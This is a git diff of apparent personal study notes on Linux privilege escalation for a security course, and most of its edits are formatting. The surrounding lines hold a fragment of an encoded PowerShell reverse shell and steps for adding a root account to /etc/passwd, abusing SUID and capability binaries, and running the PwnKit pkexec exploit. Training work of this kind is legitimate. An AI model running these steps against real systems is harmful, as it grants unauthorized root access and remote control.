@@ -3639,8 +3639,9 @@ AC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA","7")`
     uname -a
     ```
   - Q2  crontab parameter is needed to list every cron job
-    `crontab -l //current user`  
-    `sudo crontab -l //root`  
+    ```
+    crontab -l //current user 
+    `sudo crontab -l //root 
     ```
   - Q3 inherited UID called that allows a given binary to be executed with root permissions even when launched by a lower-privileged user: setuid
   - Q4 inside one of the SUID binaries available on the system
@@ -3700,8 +3701,8 @@ AC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA","7")`
     echo "root2:N5OdbV0I42eXc:0:0:root:/root:/bin/bash" >> /etc/passwd
     su root2
     ```
-- 18.4.1 Abusing setuid binaries and capabilities
-  https://gtfobins.github.io/gtfobins/gdb/
+- 18.4.1 Abusing setuid binaries and capabilities  
+  https://gtfobins.github.io/gtfobins/gdb/  
   `/usr/sbin/getcap -r / 2>/dev/null`  
   - Q1 Search for misconfigured capabilities "perl"
     output: /usr/bin/perl = cap_setuid+ep  
@@ -3725,11 +3726,11 @@ AC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA","7")`
       cat /etc/os-release > Ubuntu 16.04.4
       uname -a
       ```
-    - check SUID files , look for uncommon or custom SUID binaries > /usr/bin/pkexec
+    - check SUID files , look for uncommon or custom SUID binaries > /usr/bin/pkexec  
       `find / -perm -u=s -type f 2>/dev/null`  
     - google "Pkexec" Local Privilege Escalation
       ```
-      Download the pre-compile code https://github.com/ly4k/PwnKit/blob/main/PwnKit
+      Download the pre-compile code https://github.com/ly4k/PwnKit/blob/main/PwnKit  
       scp PwnKit joe@192.168.216.216:
       chmod +x PwnKit
       ./PwnKit
